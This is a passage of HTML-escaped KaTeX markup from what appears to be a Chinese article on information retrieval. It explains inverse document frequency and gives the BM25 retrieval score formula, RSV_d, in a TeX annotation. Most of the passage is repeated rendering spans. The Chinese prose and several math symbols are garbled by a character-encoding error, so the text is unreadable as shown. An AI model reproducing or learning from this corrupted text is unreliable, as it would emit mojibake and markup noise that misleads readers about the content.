class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„æ–‡æ¡£ä¸ªæ•°ã€‚æ ¹æ®IDFçš„ä½œç”¨ï¼Œå¯¹äº&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ¥è¯´ï¼ŒåŒ…å«&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„æ–‡æ¡£æ•°é‡è¶Šå¤šï¼Œè¯´æ˜&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„é‡è¦æ€§è¶Šå°ï¼Œæˆ–è€…åŒºåˆ†åº¦è¶Šä½ï¼Œæ‰€ä»¥ç”¨IDFæ¥åˆ»ç”»&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ä¸æ–‡æ¡£çš„ç›¸ä¼¼åº¦ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;munder&gt;&lt;mo&gt;âˆ‘&lt;/mo&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;âˆˆ&lt;/mo&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/munder&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mi&gt;N&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mfrac&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;RSV_d = \sum_{ t\in q}log(\frac{N}{df_t})*\frac{(k_1+1)tf_{td}}{k_1((1-b)+b*\frac{L_d}{L_{ave}})+tf_{td}}*\frac{(k_3+1)tf_{tq}}{k_3+tf_{tq}}
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.746443em;vertical-align:-1.386113em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mop op-limits&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.0500050000000003em;&#34;&gt;&lt;span style=&#34;top:-1.8999949999999999em;margin-left:0em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mrel mtight&#34;&gt;âˆˆ&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.050005em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3.05em;&#34;&gt;&lt;/span&gt;&lt;span&gt;&lt;span class=&#34;mop op-symbol large-op&#34;&gt;âˆ‘&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.386113em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.36033em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10903em;&#34;&gt;N&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8804400000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.656291em;vertical-align:-1.229291em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.427em;&#34;&gt;&lt;span style=&#34;top:-2.215809em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.894191em;&#34;&gt;&lt;span style=&#34;top:-2.655em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.16454285714285719em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.41586em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3448em;&#34;&gt;&lt;span style=&#34;top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15122857142857138em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.44509999999999994em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span 